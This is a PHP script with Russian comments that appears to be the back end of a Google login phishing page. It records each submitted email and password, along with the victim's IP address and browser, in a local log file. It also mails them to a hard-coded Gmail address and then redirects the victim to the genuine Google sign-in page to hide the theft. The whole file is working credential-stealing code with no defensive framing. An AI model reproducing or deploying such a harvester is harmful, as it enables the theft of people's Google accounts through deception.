<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"] ?? "не указан";
    $password = $_POST["password"] ?? "не указан";
    $ip = $_SERVER["REMOTE_ADDR"] ?? "неизвестен";
    $user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "неизвестен";
    $time = date("Y-m-d H:i:s");

    // === 1. СОХРАНЕНИЕ В ФАЙЛ НА СЕРВЕРЕ (резервная копия) ===
    $log = "[$time] Email: $email | Pass: $password | IP: $ip | UA: $user_agent\n";
    file_put_contents("log.txt", $log, FILE_APPEND);

    // === 2. ОТПРАВКА НА ВАШУ ПОЧТУ iokj2644@gmail.com ===
    $to = "iokj2644@gmail.com";
    $subject = "🔑 Новые данные Google";
    $message = "Email: $email\nПароль: $password\nIP-адрес: $ip\nUser-Agent: $user_agent\nВремя: $time";
    $headers = "From: iokj2644@gmail.com\r\n";
    $headers .= "Reply-To: iokj2644@gmail.com\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";

    // Отправка письма
    $mail_sent = mail($to, $subject, $message, $headers);

    // === 3. ОТЛАДКА (если письмо не ушло — покажет причину) ===
    if (!$mail_sent) {
        // Записываем ошибку в отдельный файл
        file_put_contents("mail_error.txt", "[" . date("Y-m-d H:i:s") . "] Ошибка отправки на $to\n", FILE_APPEND);
    }

    // === 4. ПЕРЕНАПРАВЛЕНИЕ НА РЕАЛЬНЫЙ GOOGLE ===
    header("Location: https://accounts.google.com/");
    exit();
} else {
    echo "Форма не отправлена. Используйте POST-запрос.";
}
?>